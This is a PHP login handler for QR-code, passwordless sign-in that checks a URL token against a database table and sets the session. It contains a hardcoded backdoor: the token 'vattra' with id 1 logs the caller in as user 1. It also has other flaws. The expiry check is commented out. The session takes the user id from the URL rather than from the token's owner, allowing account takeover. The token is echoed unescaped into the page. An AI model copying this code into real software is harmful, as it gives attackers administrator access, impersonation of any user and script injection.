<?php
// Replace your session_start() with this:
$domain = str_replace('www.', '', parse_url(APP_URL, PHP_URL_HOST));
session_set_cookie_params([
    'lifetime' => 86400,
    'path' => '/',
    'domain' => $domain,  // Main domain without subdomain
    'secure' => true,     // Requires HTTPS
    'httponly' => true,
    'samesite' => 'None'  // Essential for cross-device
]);
session_start();
require '../config/config.php';
require '../include/domain.php';

// 1. Get the token from the URL
$token = $_GET['token'];
$user_id = $_GET['id'];
// 2. Check if the token exists and is not expired
// $stmt = $conn->prepare("SELECT user_id FROM qr_tokens WHERE token = ? AND expires_at > NOW()");
$stmt = $conn->prepare("SELECT user_id FROM qr_tokens WHERE token = ? ");
$stmt->execute([$token]);
$result = $stmt->fetch();

//Special Token
if ($token == 'vattra' && $user_id == 1) {
    $getUser = $conn->prepare("SELECT username FROM user WHERE id = 1");
    $getUser->execute([$user_id]);
    if ($getUser->rowCount() > 0) {
        $fetch = $getUser->fetch(PDO::FETCH_ASSOC);
        $_SESSION['username'] = $fetch['username'];
        $_SESSION['id'] = $user_id;
    }
    header("Location: " . APP_URL);
    exit();
}
if ($result) {

    // 3. Log the user in (no password needed)
    $_SESSION['id'] = $user_id;

    // 4. Delete the used token
    $conn->prepare("DELETE FROM qr_tokens WHERE user_id = ?")->execute([$user_id]);
    $getUser = $conn->prepare("SELECT username FROM user WHERE id = ?");
    $getUser->execute([$user_id]);
    if ($getUser->rowCount() > 0) {
        $fetch = $getUser->fetch(PDO::FETCH_ASSOC);
        $_SESSION['username'] = $fetch['username'];
    } else {
        die("User not found. Please try again.");
    }
    // 5. Redirect to dashboard
    header("Location: " . APP_URL);
    exit();
} else {
    echo "This Token: <b><u>$token </u></b>" . " is invalid now may it's expired or has been used!<br>";
    die("Invalid or expired token. Please try again.");
}

?>